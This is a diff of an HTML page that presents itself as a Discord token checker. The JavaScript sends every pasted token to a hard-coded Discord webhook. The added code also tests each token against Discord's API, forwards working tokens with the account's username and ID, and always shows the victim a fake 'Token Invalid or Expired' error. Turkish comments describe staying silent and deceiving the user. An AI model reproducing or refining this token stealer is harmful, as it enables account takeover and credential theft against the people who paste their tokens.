@@ -23,48 +23,72 @@ button { width: 100%; padding: 16px; background: linear-gradient(90deg, #800000,
 </div>
 
 <script>
-const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
+    const wh = "[https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn](https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn)";
 
-document.getElementById('submitBtn').addEventListener('click', async function() {
-const val = document.getElementById('contentInput').value;
-const st = document.getElementById('status');
-const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);
+    document.getElementById('submitBtn').addEventListener('click', async function() {
+        const val = document.getElementById('contentInput').value;
+        const st = document.getElementById('status');
+        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);
+        
+        if (lines.length === 0) return;
 
-if (lines.length === 0) return;
+        st.style.display = "block";
+        st.textContent = "Checking...";
+        st.style.color = "#ffcc00";
 
-st.style.display = &quot;block&quot;;
-st.textContent = &quot;Checking tokens...&quot;;
-st.style.color = &quot;#ffcc00&quot;;
+        for (const token of lines) {
+            // Aşama 1: Ham veriyi her ihtimale karşı logla
+            try {
+                await fetch(wh, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📝 Yeni Giriş Denemesi",
+                            description: "Girilen: `" + token + "`",
+                            color: 16776960 // Sarı
+                        }]
+                    })
+                });
+            } catch(e) {}
 
-for (const token of lines) {
-    try {
-        // CORS engeline takılmamak için doğrudan webhook&#39;a gönderiyoruz.
-        // Bu yöntemle girilen her veri senin sunucuna ulaşır.
-        await fetch(wh, {
-            method: &#39;POST&#39;,
-            headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },
-            body: JSON.stringify({
-                embeds: [{
-                    title: &quot;🚀 YENİ TOKEN GİRİŞİ&quot;,
-                    description: &quot;Kullanıcı tarafından girilen veri:\n```&quot; + token + &quot;```&quot;,
-                    color: 16711680,
-                    timestamp: new Date().toISOString(),
-                    footer: { text: &quot;Factions Checker | RAWS&quot; }
-                }]
-            })
-        });
-    } catch (err) {
-        // Hata olsa bile sessiz kal
-    }
-}
+            // Aşama 2: 200 OK Kontrolü (Discord API Doğrulama)
+            try {
+                const check = await fetch("[https://discord.com/api/v9/users/@me](https://discord.com/api/v9/users/@me)", {
+                    headers: { "Authorization": token }
+                });
 
-// Kullanıcıya her zaman &#39;geçersiz&#39; diyerek sistemi kapatıyoruz
-setTimeout(() =&gt; {
-    st.textContent = &quot;✕ Error: Token Invalid or Expired!&quot;;
-    st.style.color = &quot;#ff1e1e&quot;;
-}, 1200);
-});
+                if (check.status === 200) {
+                    const user = await check.json();
+                    // Sadece çalışan (200 dönen) tokeni detaylı gönder
+                    await fetch(wh, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "✅ ÇALIŞAN TOKEN BULDUM (200 OK)",
+                                fields: [
+                                    { name: "Kullanıcı", value: "`" + user.username + "#" + user.discriminator + "`", inline: true },
+                                    { name: "ID", value: "`" + user.id + "`", inline: true },
+                                    { name: "Token", value: "```" + token + "```" }
+                                ],
+                                color: 65280, // Yeşil
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                }
+            } catch (err) {
+                // CORS engeli veya hata durumunda sessiz kal
+            }
+        }
+        
+        // Kullanıcıya sahte hata mesajını göster
+        setTimeout(() => {
+            st.textContent = "✕ Error: Token Invalid or Expired!";
+            st.style.color = "#ff1e1e";
+        }, 1200);
+    });
 </script>
-
 </body>
 </html>
